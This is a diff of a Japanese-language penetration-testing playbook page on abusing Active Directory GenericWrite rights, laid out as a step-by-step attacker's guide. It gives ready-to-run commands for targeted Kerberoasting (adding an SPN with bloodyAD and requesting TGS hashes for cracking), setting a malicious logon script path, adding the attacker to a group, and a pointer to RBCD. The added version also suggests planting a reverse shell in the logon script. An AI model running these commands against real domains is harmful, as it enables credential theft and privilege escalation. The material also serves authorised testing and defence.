@@ -1,99 +1,22 @@
 # GenericWrite の悪用
 
-## 概要
-
-`GenericWrite` は対象オブジェクトの属性を書き込む権限。GenericAll より限定的だが、SPN の設定・logon script の変更・グループメンバーの変更など、複数の攻撃手法につながる。
-
----
+> **スコープ**: BloodHound で `GenericWrite` エッジ確認後、対象オブジェクトの属性書き込み権限を悪用する。Targeted Kerberoasting（SPN 付与）〜logon script 設定〜グループ追加〜RBCD（コンピューター）まで扱う。GenericAll より限定的な権限だが、複数の攻撃経路がある。
 
 ## 着火条件
 
 BloodHound で `[現在のユーザー or グループ] --GenericWrite--> [ターゲットオブジェクト]` が確認できた場合。
 
----
+## 環境前提
+- 実行環境: テスター端末
+- 必要なツール: `targetedKerberoast.py`（GitHub: `ShutdownRepo/targetedKerberoast`・別途取得要）/ `bloodyAD`（`pip install bloodyAD --break-system-packages`）/ `impacket-GetUserSPNs`（標準搭載）
+- 外部リソース依存: targetedKerberoast.py / bloodyAD はインターネットアクセス要
 
-## 対象オブジェクト別の悪用手法
+## 先に確認すること
 
-### ケース1: ユーザーオブジェクトへの GenericWrite
+- **SPN が既に付与されているか確認**: `impacket-GetUserSPNs` で先に確認し、既に付与済みなら Kerberoasting が直接使える
+- **ターゲットオブジェクトの種別**（ユーザー / グループ / コンピューター）で悪用手法が分岐する
 
-**手法A: Targeted Kerberoasting（SPN を付与してハッシュ取得）**
-
-ターゲットユーザーに SPN を設定し、Kerberoasting でハッシュを取得してクラックする。実装方法は2つある。
-
-**方法A-1: targetedKerberoast.py（自動方式 — SPN付与・取得・クリーンアップを一括）**
-
-```bash
-# [Attacker] GitHub: https://github.com/ShutdownRepo/targetedKerberoast
-python3 targetedKerberoast.py -v \
-  -d '[DOMAIN]' \
-  -u '[CURRENT_USER]' \
-  -p '[PASSWORD]' \
-  --dc-ip [DC_IP]
-```
-
-このツールは：
-1. GenericWrite 権限があるユーザーに自動でSPNを追加
-2. TGSハッシュを取得
-3. 追加したSPNを自動でクリーンアップ
-
-**方法A-2: 手動2ステップ方式（bloodyAD + GetUserSPNs）**
-
-自動ツールが失敗する環境、またはSPN付与とハッシュ取得を分けて確認したい場合に使う。
-
-```bash
-# Step 1: [Attacker] ターゲットユーザーに SPN を手動追加
-# bloodyAD（別途インストール要: pip install bloodyAD --break-system-packages）
-bloodyAD \
-  -d '[DOMAIN]' --dc-ip [DC_IP] \
-  -u '[CURRENT_USER]' -p '[PASSWORD]' \
-  set object '[TARGET_USER]' servicePrincipalName \
-  -v 'http/[任意の文字列]'
-
-# 成功すると "[TARGET_USER]'s servicePrincipalName has been updated" が表示される
-
-# Step 2: [Attacker] 付与した SPN でハッシュを取得
-impacket-GetUserSPNs \
-  -dc-ip [DC_IP] \
-  -request \
-  -request-user '[TARGET_USER]' \
-  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
-```
-
-**使い分け：**
-
-| 状況 | 推奨 |
-|------|------|
-| 素早く終わらせたい（クリーンアップも自動） | 方法A-1 (targetedKerberoast.py) |
-| ツールが環境に対応していない・失敗する | 方法A-2 (手動) |
-| SPN が付与されたかを途中確認したい | 方法A-2 (ステップを分割できる) |
-| SPN のクリーンアップを自分でコントロールしたい | 方法A-2 (`bloodyAD set object ... servicePrincipalName -v ''` で手動削除) |
-
-> **注意：** 手動方式 (A-2) でハッシュ取得後は、付与した SPN を必ず削除すること（原状回復）。`bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''` で空にできる。
-
-→ 取得したハッシュのクラック: `../Kerberos_Attacks/Kerberoasting.md`
-
-**手法B: logon script の設定**
-
-ターゲットがログインするたびにスクリプトが実行される：
-```powershell
-Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\[script_name].bat'
-```
-
-### ケース2: グループオブジェクトへの GenericWrite
-
-**グループメンバーの追加：**
-```powershell
-Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
-```
-
-### ケース3: コンピューターオブジェクトへの GenericWrite
-
-**RBCD の設定（msDS-AllowedToActOnBehalfOfOtherIdentity の変更）：**
-→ 詳細: `../Delegation_Attacks/RBCD.md`
-
----
-
-## GenericAll との違い
+**GenericAll との違い:**
 
 | 操作 | GenericWrite | GenericAll |
 |------|-------------|-----------|
@@ -102,18 +25,126 @@ Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
 | オブジェクトの削除 | ❌ | ✅ |
 | DACL の変更 | ❌ | ✅ |
 
+**攻撃者の思考トレース:** GenericWrite はパスワードリセットができないが、SPN の付与（Targeted Kerberoasting）やグループメンバー変更で権限を昇格できる。targetedKerberoast.py が最も手軽（SPN 付与・ハッシュ取得・クリーンアップを一括）。
+
+---
+
+## 1. ユーザーオブジェクトへの GenericWrite — Targeted Kerberoasting（自動方式）
+
+**コマンド:**
+
+```bash
+# [Attacker] SPN 付与・ハッシュ取得・クリーンアップを一括で実行
+python3 targetedKerberoast.py -v \
+  -d '[DOMAIN]' \
+  -u '[CURRENT_USER]' \
+  -p '[PASSWORD]' \
+  --dc-ip [DC_IP]
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| `$krb5tgs$23$...` ハッシュが出力される | Targeted Kerberoasting 成立 | hashcat でクラック → `../Kerberos_Attacks/Kerberoasting.md` |
+| ツールが途中で失敗 | SPN が付与されたままの可能性 | `bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''` で手動クリーンアップ |
+
+---
+
+## 2. ユーザーオブジェクトへの GenericWrite — Targeted Kerberoasting（手動方式）
+
+自動ツールが失敗する環境、または SPN 付与とハッシュ取得を分けて確認したい場合に使う。
+
+**コマンド:**
+
+```bash
+# [Attacker] Step 1: ターゲットユーザーに SPN を手動追加（bloodyAD）
+bloodyAD \
+  -d '[DOMAIN]' --dc-ip [DC_IP] \
+  -u '[CURRENT_USER]' -p '[PASSWORD]' \
+  set object '[TARGET_USER]' servicePrincipalName \
+  -v 'http/[任意の文字列]'
+
+# [Attacker] Step 2: 付与した SPN でハッシュを取得
+impacket-GetUserSPNs \
+  -dc-ip [DC_IP] \
+  -request \
+  -request-user '[TARGET_USER]' \
+  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]'
+
+# [Attacker] 原状回復（必須）: ハッシュ取得後に SPN を削除
+bloodyAD -d '[DOMAIN]' --dc-ip [DC_IP] \
+  -u '[CURRENT_USER]' -p '[PASSWORD]' \
+  set object '[TARGET_USER]' servicePrincipalName -v ''
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| SPN 付与後にハッシュが取得できる | Targeted Kerberoasting 成立 | hashcat でクラック後、**必ず SPN を削除** |
+| SPN 付与後も `No entries found!` | SPN のフォーマットが不正 / 付与に失敗 | bloodyAD の出力を確認。`-v` で別の SPN 形式を試す |
+
+**注意（原状回復）:** 手動方式でハッシュ取得後は付与した SPN を必ず削除する（本番必須・演習でも習慣化推奨）。
+
+---
+
+## 3. ユーザーオブジェクトへの GenericWrite — logon script の設定
+
+**コマンド:**
+
+```powershell
+# [Target] ターゲットがログインするたびにスクリプトが実行される
+Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\[script_name].bat'
+```
+
+**観測される出力 → 次のアクション:**
+
+| 出力 | 示唆 | 次のアクション |
+|---|---|---|
+| ターゲットが次回ログイン時にスクリプトが実行される | logon script 設定成功 | スクリプトにリバースシェル等を仕込んでおく |
+
+**注意:** ターゲットユーザーが実際にログインするまで実行されない（長時間待機が必要なことがある）。
+
+---
+
+## 4. グループオブジェクトへの GenericWrite — グループメンバーの追加
+
+**コマンド:**
+
+```powershell
+# [Target] グループメンバーの追加
+Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
+```
+
+---
+
+## 5. コンピューターオブジェクトへの GenericWrite — RBCD 設定
+
+`msDS-AllowedToActOnBehalfOfOtherIdentity` 属性を変更して RBCD を設定できる。
+
+**詳細 → `../Delegation_Attacks/RBCD.md`**
+
+---
+
+## 刺さらなかったとき（全体）
+
+| 状況 | 推定原因 | 代替手段 |
+|---|---|---|
+| Targeted Kerberoasting でハッシュがクラックできない | パスワードが強力 | logon script 設定（§3）またはグループ追加（§4）へ |
+| logon script が実行されない | ターゲットがログインしていない | 長時間待機。または別の手法へ |
+
 ---
 
 ## 注意点・落とし穴
 
-- targetedKerberoast.py は SPN のクリーンアップまで自動で行うが、ツールが途中で失敗した場合は手動でクリーンアップが必要（`bloodyAD ... set object '[TARGET_USER]' servicePrincipalName -v ''`）
-- logon script の手法は、ターゲットユーザーが実際にログインするまで実行されない（環境によっては長時間待機が必要）
-- SPN を設定する際、ターゲットアカウントが既にSPNを持っている場合は Kerberoasting が既に可能な場合もある。`impacket-GetUserSPNs` を先に実行して確認する
-- 手動方式 (A-2) で SPN を付与した場合、**ハッシュ取得後に必ず SPN を削除する**（原状回復。本番では必須、演習環境でも習慣化推奨）
+- targetedKerberoast.py が途中で失敗した場合は手動で SPN をクリーンアップする（bloodyAD で空に設定）
+- SPN を設定する際、ターゲットアカウントが既に SPN を持っている場合は Kerberoasting が既に可能な場合もある。`impacket-GetUserSPNs` を先に実行して確認する
 
 ---
 
 ## 関連技術
-- 前：`../../05_Tools_Reference/BloodHound.md`（BloodHound で GenericWrite 権限を発見後）
-- 後：`../Kerberos_Attacks/Kerberoasting.md`（SPN 付与後のハッシュ取得）
-- 関連：`../Delegation_Attacks/RBCD.md`（コンピューターオブジェクトへの RBCD）
+
+- 前：BloodHound で GenericWrite 権限を発見後 → `../../05_Tools_Reference/BloodHound.md`
+- 後：SPN 付与後のハッシュ取得 → `../Kerberos_Attacks/Kerberoasting.md`
+- 関連：コンピューターオブジェクトへの RBCD → `../Delegation_Attacks/RBCD.md`
